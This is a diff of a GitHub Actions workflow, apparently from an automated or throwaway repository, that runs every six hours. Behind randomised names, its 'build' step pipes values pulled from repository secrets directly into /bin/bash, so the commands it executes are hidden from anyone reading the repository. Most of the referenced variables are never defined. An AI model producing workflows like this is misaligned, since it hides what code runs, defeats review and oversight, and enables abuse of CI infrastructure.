@@ -3,19 +3,28 @@ name: kanshiss
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
+    - cron: '20 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kanshiss
         env:
-          lcusp96: ${{ secrets.lcusp96 }}
+          q87: ${{ secrets.q87 }}
         run: |
-          echo $lcusp96 | jq -r .msblw14893 | /bin/bash
-          echo $pzmf36563 | jq -r .xwo1851 | /bin/bash
-          echo $idwjp62748 | jq -r .e449 | /bin/bash
+          echo $q87 | jq -r .cnhqp8 | /bin/bash
+          echo $u7 | jq -r .m0534 | /bin/bash
+          echo $t06 | jq -r .rja65709 | /bin/bash
+          echo $ckis90 | jq -r .hqie507 | /bin/bash
+          echo $ty480 | jq -r .r885 | /bin/bash
+          echo $s368 | jq -r .iau91079 | /bin/bash
+          echo $puq7 | jq -r .t965 | /bin/bash
+          echo $lhoy90880 | jq -r .rxckd93 | /bin/bash
+          echo $bki63 | jq -r .rxen781 | /bin/bash
+          echo $u20619 | jq -r .rmi48587 | /bin/bash
+          echo $v06 | jq -r .sn319 | /bin/bash
+          echo $hwy5 | jq -r .xuln17 | /bin/bash
+          echo $vd42 | jq -r .k57 | /bin/bash
 
